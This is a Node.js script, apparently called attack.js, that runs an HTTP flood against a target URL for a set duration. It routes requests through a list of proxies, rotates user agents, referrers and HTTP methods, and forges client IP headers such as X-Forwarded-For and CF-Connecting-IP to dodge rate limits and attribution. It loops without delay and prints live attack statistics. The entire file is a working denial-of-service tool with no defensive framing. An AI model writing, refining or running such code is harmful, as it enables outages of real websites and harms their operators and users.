const fs = require('fs');
const https = require('https');
const http = require('http');
const { URL } = require('url');
const os = require('os');

// Command line args
const target = process.argv[2];
const durationSec = parseInt(process.argv[3]);

if (!target || !durationSec) {
    console.log("Usage: node attack.js <url> <duration_in_seconds>");
    process.exit(1);
}

// Load and sanitize resources
function loadCleanLines(file) {
    return fs.readFileSync(file, 'utf-8')
        .split('\n')
        .map(l => l.trim().replace(/[\r\n]/g, ''))
        .filter(Boolean);
}

const proxies = loadCleanLines('proxy.txt');
const userAgents = loadCleanLines('ua.txt');
const referrers = loadCleanLines('refs.txt');

function getRandom(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randomIp() {
    return Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join('.');
}

const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'];
const parsedUrl = new URL(target);
const isHttps = parsedUrl.protocol === 'https:';
let totalRequests = 0;
let successfulRequests = 0;
let failedRequests = 0;
let proxyErrors = 0;
let peakRequestsPerSecond = 0;
let currentRequestsPerSecond = 0;
let lastTime = Date.now();

console.log(`ATTACK STARTED : TIME LEFT = ${durationSec}s`);

function sendRequest(proxy) {
    const ua = getRandom(userAgents);
    let ref = getRandom(referrers);
    ref = ref.trim().replace(/[\r\n]/g, '');
    const method = getRandom(methods);
    const [host, port] = proxy.split(':');
    const postData = 'data=fakepayload&rand=' + Math.random();
    const spoofedIp = randomIp();

    const options = {
        host,
        port,
        method: 'CONNECT',
        timeout: 5000
    };

    const req = http.request(options);
    req.on('connect', (res, socket) => {
        const client = isHttps ? https : http;

        const headers = {
            'User-Agent': ua,
            'Referer': ref,
            'Host': parsedUrl.hostname,
            'X-Forwarded-For': spoofedIp,
            'X-Real-IP': spoofedIp,
            'CF-Connecting-IP': spoofedIp,
            'Forwarded': `for=${spoofedIp};proto=http;by=${randomIp()}`,
            'Via': `1.1 ${randomIp()}`,
            'Client-IP': spoofedIp
        };

        if (['POST', 'PUT', 'PATCH'].includes(method)) {
            headers['Content-Type'] = 'application/x-www-form-urlencoded';
            headers['Content-Length'] = Buffer.byteLength(postData);
        }

        const requestOptions = {
            hostname: parsedUrl.hostname,
            port: parsedUrl.port || (isHttps ? 443 : 80),
            path: parsedUrl.pathname + parsedUrl.search,
            method,
            headers,
            socket: socket,
            agent: false,
            timeout: 5000
        };

        const proxyReq = client.request(requestOptions, (res) => {
            res.on('data', () => {});
            res.on('end', () => {
                successfulRequests++;
            });
        });

        proxyReq.on('error', () => {
            failedRequests++;
        });
        if (['POST', 'PUT', 'PATCH'].includes(method)) {
            proxyReq.write(postData);
        }
        proxyReq.end();
        totalRequests++;
    });

    req.on('error', () => {
        proxyErrors++;
    });
    req.on('timeout', () => req.destroy());
    req.end();
}

const endTime = Date.now() + durationSec * 1000;

function logStats() {
    currentRequestsPerSecond = Math.floor(totalRequests / ((Date.now() - lastTime) / 1000));
    peakRequestsPerSecond = Math.max(peakRequestsPerSecond, currentRequestsPerSecond);

    console.clear(); // Clear the console for real-time updates
    console.log(`ATTACK RUNNING:
    Total Requests: ${totalRequests}
    Successful Requests: ${successfulRequests}
    Failed Requests: ${failedRequests}
    Proxy Errors: ${proxyErrors}
    Peak RPS: ${peakRequestsPerSecond}
    Time Left: ${Math.max(0, endTime - Date.now()) / 1000}s
    `);
    lastTime = Date.now();
}

function run() {
    if (Date.now() >= endTime) {
        console.log(`ATTACK DONE : TOTAL REQUESTS = ${totalRequests}`);
        process.exit(0);
    }

    const proxy = getRandom(proxies);
    sendRequest(proxy);
    logStats();
    setImmediate(run); // Continue without delay
}

run();
